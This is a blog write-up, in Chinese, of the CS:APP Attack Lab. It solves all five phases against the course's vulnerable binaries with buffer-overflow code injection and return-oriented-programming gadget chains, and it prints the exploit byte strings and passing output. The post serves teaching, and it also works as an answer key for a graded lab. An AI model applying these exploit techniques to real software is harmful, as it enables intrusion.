---
title: CSAPP - Attack Lab
date: 2024-07-05
tags:
  - CSAPP
categories:
  - Project
---

# 文件说明

`ctarget`: An executable program vulnerable to **code-injection**(CI) attacks.  
`rtarget`: An executable program vulnerable to **return-oriented-programming**(ROP) attacks.  
`cookie.txt`: An 8-digit hex code that you will use as a unique identifier in your attack  
`farm.c`: 用来生成 ROP 攻击的代码。  
`hex2raw`: 生成攻击字符串的工具。

输入`ctarget -h`查看帮助信息：

```shell
Usage: [-hq] ./ctarget -i <infile>
  -h          Print help information
  -q          Don't submit result to server
  -i <infile> Input file
```

我们在本地跑的话必须加上`-q`选项，否则会提示`Running on an illegal host`错误。

# 工具使用

## hex2raw

`hex2raw` 可以将文本中保存的 ascii 码值转化成字符串。注意每个 ascii 需要以空格分开，可以加注释(注释/\* \*/前后需要空格)。

比如在`exploit.txt`中保存`30 31 32 33 34 35 /* 012345 */`，通过`cat exploit.txt | ./hex2raw/`，可以转换成字符串`012345`。输入`48 c7 c1 f0 11 40 00 /* mov $0x40011f0,%rcx */`就是一条指令。

因为 ASCII 键盘可输入的值只有从 0x20~0x7e，所以我们没法通过键盘输入所有想要的字节，比如 0x19。  
这就要利用到`hex2raw`工具，可以把这些范围外的值输入给 ctarget,比如`./hex2raw < exploit.txt | ./ctarget`

## 将汇编指令转化为字节流

在我们准备注入代码时，需要将要注入的指令转化为字节流。

准备好需要翻译的指令文件`example.s`，比如:

```txt
pushq $0xabcdef	# Push value onto stack
addq $17,%rax 	# Add 17 to %rax
movl %eax,%edx 	# Copy lower 32 bits to %edx
```

执行

```shell
gcc -c example.s
objdump -d example.o > example.d
```

## 实验讲解

具体参考讲义 attacklab.pdf。

`CTARGET`和`RTARGET`都从标准输入读取字符串，形式如下：

```c
unsigned getbuf()
{
	char buf[BUFFER_SIZE];
	Gets(buf);
	return 1;
}
```

`Gets()`函数类似于标准库函数的`gets()`，从标准输入读取字符串直到遇到换行符`\n`或 end-of-file。然后将该字符串加上一个终止符`\0`保存进传入的 buffer。  
如果传入的字符串大于 buffer 的大小，那么就会发生 buffer overflow。

如果传入的字符串很短，那么显然`getbuf`会返回 1，输入如下信息：

```shell
unix> ./ctarget

Cookie: 0x1a7dd803
Type string: Keep it short!
No exploit. Getbuf returned 0x1
Normal return
```

如果输入了一个长字符串，那么会报如下错误：

```shell
unix> ./ctarget
Cookie: 0x1a7dd803
Type string: This is not a very interesting string, but it has the property ...
Ouch!: You caused a segmentation fault!
Better luck next time
```

注意：

- 传入的字符串不要包含`0x0a`，对应的是`\n`换行符，`Gets()`会停止接受后面的字符串。
- `hex2raw`对应的字节都需要两个数字来表示，0 需要是`00`，`0xdeadbeef`需要传入`ef be ad de`。注意小端序。

实验一共包含 5 个 phases，三个 CI 攻击，两个 ROP 攻击。  
![](https://xyc-1316422823.cos.ap-shanghai.myqcloud.com/20240718225041.png)

## 运行 ctarget 出现 segement fault

然而在我的 ubuntu22.04 中，运行`./ctarget`，没有提示输入字符串而直接报错了。搜了下是 ubuntu22.04 的版本原因。

```shell
Cookie: 0x59b997fa
Ouch!: You caused a segmentation fault!
Better luck next time
FAIL: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:FAIL:0xffffffff:ctarget:0:
```

解决方法: https://blog.rijuyuezhu.top/posts/db646f34/  
利用博主提供的`printf.so`代替 glibc 中的 printf 库。再执行`LD_PRELOAD=./printf.so ./ctarget -q`就成功解决了。

gdb 调试首先将`phase1.txt`通过`hex2raw`翻译成 ascii 码`./hex2raw < phase1.txt > phase1-raw.txt`

`gdb ctarget`后需要输入:

```shell
(gdb) set environment LD_PRELOAD=./printf.so
(gdb) r -q < phase1-raw.txt

```

# 实验解答

## Code Injection Attacks

CI 实验保证了两个前提:

1. 栈地址是固定的，不会采用栈随机化的方法。
2. 栈上的 data 是 executable 可执行的。

`CTARGET`中`test()`函数调用了`getbuf()`，如果`getbuf()`正常返回的话会执行下面一行打印语句。

```c
void test()
{
	int val;
	val = getbuf();
	printf("No exploit. Getbuf returned 0x%x\n", val);
}
```

`getbuf()`函数前面已经提到过了，如下:

```c
unsigned getbuf()
{
	char buf[BUFFER_SIZE];
	Gets(buf);
	return 1;
}
```

### phase1

phase1 不会注入新的 code，而是需要利用输入的字符串将程序重定向到执行另一块现有代码。

现在我们需要将`getbuf`函数重定向到`touch1()`而不是返回`test()`。

```c
 void touch1()
{
	vlevel = 1; /* Part of validation protocol */
	printf("Touch1!: You called touch1()\n");
	validate(1);
	exit(0);
}
```

首先需要将`ctarget`反汇编，`objdump -d ctarget > ctarget.txt`。

找到`touch`函数的地址为`0x4017c0`。

```txt
00000000004017c0 <touch1>:
  4017c0:	48 83 ec 08          	sub    $0x8,%rsp
  4017c4:	c7 05 0e 2d 20 00 01 	movl   $0x1,0x202d0e(%rip)        # 6044dc <vlevel>
  4017cb:	00 00 00
  4017ce:	bf c5 30 40 00       	mov    $0x4030c5,%edi
  4017d3:	e8 e8 f4 ff ff       	call   400cc0 <puts@plt>
  4017d8:	bf 01 00 00 00       	mov    $0x1,%edi
  4017dd:	e8 ab 04 00 00       	call   401c8d <validate>
  4017e2:	bf 00 00 00 00       	mov    $0x0,%edi
  4017e7:	e8 54 f6 ff ff       	call   400e40 <exit@plt>
```

查看`getbuf`函数，可以看出分配了 0x28 的栈空间，因此数组大小`BUFFER_SIZE`为 0x28。

```txt
00000000004017a8 <getbuf>:
  4017a8:	48 83 ec 28          	sub    $0x28,%rsp
  4017ac:	48 89 e7             	mov    %rsp,%rdi
  4017af:	e8 8c 02 00 00       	call   401a40 <Gets>
  4017b4:	b8 01 00 00 00       	mov    $0x1,%eax
  4017b9:	48 83 c4 28          	add    $0x28,%rsp
  4017bd:	c3                   	ret
  4017be:	90                   	nop
  4017bf:	90                   	nop
```

再查看调用`getbuf`函数的`test`函数地址为`0x401968`，因此我们需要做的就是把该返回地址`0x401968`替换为`touch1`的地址`0x4017c0`。

![](https://xyc-1316422823.cos.ap-shanghai.myqcloud.com/20240719213815.png)

首先填充任意 0x28 个字节，最后 8 个字节为`c0 17 40 00 00 00 00 00`，就可以到达`touch1`。

exploit.txt 中 level 1 的答案为：

```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
c0 17 40 00 00 00 00 00
```

```shell
$ ./hex2raw < phase1.txt | LD_PRELOAD=./printf.so ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 C0 17 40 00
```

### phase2

phase2 需要注入一段攻击代码。

最终目标是跳转到`touch2`函数，并且控制传入`touch2`的参数`val`是我们的`cookie`值。

```c
void touch2(unsigned val)
{
	vlevel = 2; /* Part of validation protocol */

	if (val == cookie) {
		printf("Touch2!: You called touch2(0x%.8x)\n", val);
		validate(2);
	} else {
		printf("Misfire: You called touch2(0x%.8x)\n", val);
		fail(2);
	}
	exit(0);
}
```

如果利用 level1 的方法，只能修改 return address 跳转到 touch2，而没有办法控制传入的参数，即修改`%rdi`的值。

因此我们需要在`getbuf`函数 ret 返回后，先跳转到我们的注入代码入口地址。然后在注入的代码配置好 touch2 的参数即寄存器`%rdi`的值，再利用 ret 跳转到`touch2`函数。

![](https://xyc-1316422823.cos.ap-shanghai.myqcloud.com/20240720081208.png)

需要利用 gdb 调试来一步一步观察程序如何运行。

```shell
./hex2raw < phase2.txt > phase2-raw.txt

gdb ctarget
(gdb) set environment LD_PRELOAD=./printf.so
(gdb) r -q < phase2-raw.txt
(gdb) b getbuf
(gdb) disassemble
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:     sub    $0x28,%rsp
=> 0x00000000004017ac <+4>:     mov    %rsp,%rdi
   0x00000000004017af <+7>:     call   0x401a40 <Gets>
   0x00000000004017b4 <+12>:    mov    $0x1,%eax
   0x00000000004017b9 <+17>:    add    $0x28,%rsp
   0x00000000004017bd <+21>:    ret
(gdb) info r
rsp            0x5561dc78          0x5561dc78
```

打印出%rsp 的值，为`0x5561dc78`，是我们注入代码的地址入口。因此我们首先要覆盖第一次的返回地址，在 buf 的溢出区把返回 test 的地址`0x401968`修改为`0x5561dc78`。

这样`getbuf`第一次返回后跳转至栈上的代码开始运行。我们需要干的事情有：

```txt
# phase2_ass_code.s

movq $0x4017ec, (%rsp)
movq $0x59b997fa, %rdi
ret
```

1. 将此时的栈指针%rsp 的值修改为 touch2 函数入口(在执行完 getbuf 后，%rsp 指向图中 return address)。
2. 修改%rdi 的值为 cookie 值。
3. ret 返回。即返回当前栈保存的地址。

```shell
gcc -c phase2_ass_code.s
objdump -d phase2_ass_code.o > phase2_ass_code.d
```

phase2_ass_code.d 的内容为：

```txt
phase2_ass_code.o:     file format elf64-x86-64

Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 c7 04 24 ec 17 40 	movq   $0x4017ec,(%rsp)
   7:	00
   8:	48 c7 c7 fa 97 b9 59 	mov    $0x59b997fa,%rdi
   f:	c3                   	ret
```

将生成的字节流保存进 phase2.txt，因此最后的答案为

```txt
48 c7 04 24 ec 17 40 00 /* movq   $0x4017ec,(%rsp) */
48 c7 c7 fa 97 b9 59 c3 /* mov    $0x59b997fa,%rdi;ret */
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
78 dc 61 55 00 00 00 00 /* change getbuf return address to injected code in stack*/
```

得到正确结果

```shell
./hex2raw < phase2.txt | LD_PRELOAD=./printf.so ./ctarget -q

Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 04 24 EC 17 40 00 48 C7 C7 FA 97 B9 59 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00
```

**可改进的地方：**

`movq   $0x4017ec,(%rsp)`将 touch2 地址保存到栈中的操作，可用`pushq $0x4017ec`代替。

### phase3

level3 需要跳转到`touch3`, 并且传入一个字符串，调用`hexmatch`函数，检查该字符串值是否与 cookie 一致。

```c
 int hexmatch(unsigned val, char *sval)
{
	char cbuf[110];
	/* Make position of check string unpredictable */
	char *s = cbuf + random() % 100;
	sprintf(s, "%.8x", val);
	return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval)
{
	vlevel = 3; /* Part of validation protocol */
	if (hexmatch(cookie, sval)) {
		printf("Touch3!: You called touch3(\"%s\")\n", sval);
		validate(3);
	} else {
		printf("Misfire: You called touch3(\"%s\")\n", sval);
		fail(3);
	}
	exit(0);
}
```

思路和 level2 类似，需要先跳转到注入代码，将字符串存储在栈上，将字符串地址传入`%rdi`后调用`touch3`。  
字符串的内容为"59b997fa", 对应的 ascii 码值为`0x35 0x39 0x62 0x39 0x39 0x37 0x66 0x61`，注意这边字符串在内存中存放的顺序，最低位应该是"5"，最高位是"a"，字符串是按顺序存放的。而不是像 int 型小端序存放，高位在高地址，低位在低地址。

因此注入代码为：

```txt
movq $0x6166373939623935, %rax
pushq %rax 		# store string in stack
movq %rsp, %rdi
pushq $0x4018fa		# touch3 entry
ret
```

![](https://xyc-1316422823.cos.ap-shanghai.myqcloud.com/20240720100747.png)

需要注意的一个点是，字符串在栈中的存放位置必须在栈中 touch3 地址的上方，因为在执行`ret`跳转至`touch3`后，此时`%rsp`会指向 touch3 entry 上方地址，接下来进入`touch3`函数，会有一些压栈的动作，如果字符串保存在 touch3 entry 下方，那么就会被覆盖。

**可改进的地方**：
注入代码`movq $0x6166373939623935, %rax`先传立即数, 再将立即数压栈`pushq %rax`的方式有点繁琐了。  
可直接将立即数通过注入代码，直接保存到栈中，再将栈地址传入`%rdi`是一样的效果。

## Return-Oriented Programming

RTARGET 中启用了 1.**栈随机化**，2.栈所在的内存是**nonexecutable**。  
这导致了在 CTARGET level2&3 用到的注入代码技巧在 RTARGET 中无法使用。

ROP 要求我们从现有的代码中，找到我们需要的攻击代码(下图 gadget)，利用 ret 来进行跳转。

![](https://xyc-1316422823.cos.ap-shanghai.myqcloud.com/20240730200646.png)

利用缓冲区溢出将栈上数据都替换成 gadget code，这样第一次执行 ret 后会跳转到 gadget1 code，再通过 gadget1 最后的 ret(c3)跳转到 gadget2 code。每个 gadget code 最后都需要包含 ret(c3)来跳转。

一些指令对应的二进制编码：

ret `0xc3`
nop `0x90`

![](https://xyc-1316422823.cos.ap-shanghai.myqcloud.com/20240730212039.png)

![](https://xyc-1316422823.cos.ap-shanghai.myqcloud.com/20240730221223.png)

### phase4

利用 ROP 技术实现 CTARGET 中的 phase2。需要实现的目标还是一样，将 cookie 保存在`%rdi`中，然后跳转至`touch2`函数。

首先反汇编 RTARGET`objdump -d rtarget > rtarget.txt`。  
根据讲义中的提示，我们需要找的 gadget 在`start_farm`到`end_farm`之间。可以使用的指令有`movq`, `popq`, `ret`, `nop`。

首先我们想要把 cookie 传入`%rdi`中，有两种方式，一种通过`movq $59b997fa %rdi`把立即数传入到`%rdi`中，但是在 farm 中并没有能找到 cookie 对应的值。  
另一种方式想到通过`popq %rdi`将栈中预先保存的 cookie 值加载到`%rdi`中。对应的二进制代码为`5f`，但是在 farm 中仍然没有找到。想到先通过`popq %rax`将 cookie 保存到`%rax`，再`movq %rax, %rdi`把`%rax`的值存进`%rdi`。对应的二进制代码为`58`。

可以在 farm 中找到对应的代码，地址为 0x4019ab，`58 90 c3`，分别为`popq %rax`, `nop`, `ret`。

```txt
00000000004019a7 <addval_219>:
  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax
  4019ad:	c3
```

再寻找`movq %rax, %rdi` `48 89 c7`, 找到地址 0x4019c5 的 code`48 89 c7 90 c3`，分别为`movq %rax, %rdi`, `nop`, `ret`。

```txt
00000000004019c3 <setval_426>:
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	ret
```

最后 ret 到栈中保存的`touch2`入口地址，进入`touch2`函数。整个栈中的数据如图所示：

![](https://xyc-1316422823.cos.ap-shanghai.myqcloud.com/20240730224416.png)

因此最后的`phase4.txt`为：

```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* first 0x28 bytes non-overflow data don't matter */
ab 19 40 00 00 00 00 00 /* gadget1 code address, code at address: popq %rax;nop;ret */
fa 97 b9 59 00 00 00 00 /* cookie 0x59b997fa*/
c5 19 40 00 00 00 00 00 /* gadget2 code2 address, code at address: movq %rax, %rdi;nop;ret */
ec 17 40 00 00 00 00 00 /* touch2 entry */
```

终端打印成功信息：

```shell
.././hex2raw < phase4.txt > phase4-raw.txt # phase4-raw.txt for gdb debug
.././hex2raw < phase4.txt | .././rtarget -q

Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C5 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00
```

### phase5

目标与 phase3 相同，需要将 cookie 字符串地址传入`%rdi`, 并跳转到 touch3。

根据讲义中的指令编码

```txt
48 89 xx 	movq
58~5f 		popq
89 xx		movl
20 xx		andb
08 xx		orb
38 xx		cmpb
84 xx		testb
90		nop
c3		ret
```

在 farm 中可以找到和 movq, popq, movl 相关的指令有：

```txt
4019a2: 48 89 c7 c3	movq %rax, %rdi
4019ab: 58 90 c3	popq %rax
401a06:	48 89 e0 c3	movq %rsp, %rax
4019a3: 89 c7 c3	movl %eax, %edi
4019dd: 89 c2 90 c3	movl %eax, %edx
401a07: 89 e0 c3	movl %esp, %eax
401a13: 89 ce 90 90 c3	movl %ecx, %esi
401a34:	89 d1 c8 c9 c3  movl %edx, %ecx
```

寻找一些对此题有用的指令，我们可以想到字符串肯定是要保存在栈中的，而栈的地址又是随机的，那么只能通过操作`%rsp`寄存器来获取栈地址了。

发现 0x401a03 处有`48 89 e0 c3` `movq %rsp, %rax;ret`可以将栈地址保存到%rax。  
但又迎来了一个问题，当%rsp 地址保存的是 cookie 值时，执行`movq %rsp, %rax`确实可以将 cookie 字符串地址保存到%rax，再通过`movq %rax, %rdi`传入%rdi。  
但执行`ret`后会跳转到以 cookie 值为地址的地方执行 code，导致 segement fault。

</br>

接下来的操作参考了https://www.viseator.com/2017/07/18/CS_APP_AttackLab/ , 发现在 farm 中有这样一个函数：

```txt
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq
```

有了这个，我们就可以把`%rsp`的值加上一个数偏移若干后表示存放目标字符串的位置，就不会与需要执行的指令冲突了。栈结构如下图所示：

![](https://xyc-1316422823.cos.ap-shanghai.myqcloud.com/20240801223519.png)

偏移量为加载%rsp`movq %rsp, %rax`后到目标字符串的距离，4\*8=0x20。

注意目标字符串的地址需要比 touch3 高，原因见[phase3](###phase3)。

最后的 phase5.txt 为：

```txt
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 /* first 0x28 bytes non-overflow data don't matter */
ab 19 40 00 00 00 00 00 /* gadget1 code address, code at address: popq %rax;nop;ret */
20 00 00 00 00 00 00 00 /* offset */
dd 19 40 00 00 00 00 00 /* movl %eax, %edx */
34 1a 40 00 00 00 00 00 /* movl %edx, %ecx */
13 1a 40 00 00 00 00 00 /* movl %ecx, %esi */
06 1a 40 00 00 00 00 00 /* movl %rsp, %rax */
a2 19 40 00 00 00 00 00 /* movl %rax, %rdi */
d6 19 40 00 00 00 00 00 /* add_xy */
a2 19 40 00 00 00 00 00 /* movl %rax, %rdi */
fa 18 40 00 00 00 00 00 /* touch3 entry */
35 39 62 39 39 37 66 61 /* cookie string according to "0x59b997fa"*/
```

最终终端打印为：

```shell
$ .././hex2raw < phase5.txt > phase5-raw.txt # for gdb debug, (gdb) r -q < phase5-raw.txt
$ .././hex2raw < phase5.txt | .././rtarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 AB 19 40 00 00 00 00 00 20 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 34 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61
```
